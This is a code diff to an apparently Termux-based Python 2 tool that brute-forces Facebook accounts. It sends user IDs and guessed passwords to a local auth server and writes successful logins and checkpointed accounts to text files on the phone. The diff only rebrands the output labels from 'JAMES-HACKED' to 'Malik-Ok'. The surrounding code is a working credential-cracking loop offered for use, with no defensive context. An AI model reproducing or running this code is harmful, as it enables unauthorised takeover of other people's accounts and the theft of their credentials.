@@ -63,7 +63,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    if not os.path.isfile("/data/data/com.termux/files/home/tsst/...../node_modules/bytes/index.js"):
+    if not os.path.isfile("/data/data/com.termux/files/home/sani/...../public/index.js"):
         os.system("cd ..... && npm install")
         os.system("fuser -k 5000/tcp &")
         os.system("#")
@@ -489,13 +489,13 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\033[1;92m[Malik-Ok] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass1
+                print '\033[1;31;1m[Malik-Cp] ' + uid + ' | ' + pass1
                 cp = open('HOP_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -505,13 +505,13 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\033[1;92m[Malik-Ok] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass2
+                    print '\033[1;31;1m[Malik-Cp] ' + uid + ' | ' + pass2
                     cp = open('HOP_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -676,13 +676,13 @@ def c_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\033[1;92m[Malik-Ok] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass1
+                print '\033[1;31;1m[Malik-Cp] ' + uid + ' | ' + pass1
                 cp = open('HOP_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -691,13 +691,13 @@ def c_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\033[1;92m[Malik-Ok] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass2
+                    print '\033[1;31;1m[Malik-Cp] ' + uid + ' | ' + pass2
                     cp = open('HOP_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
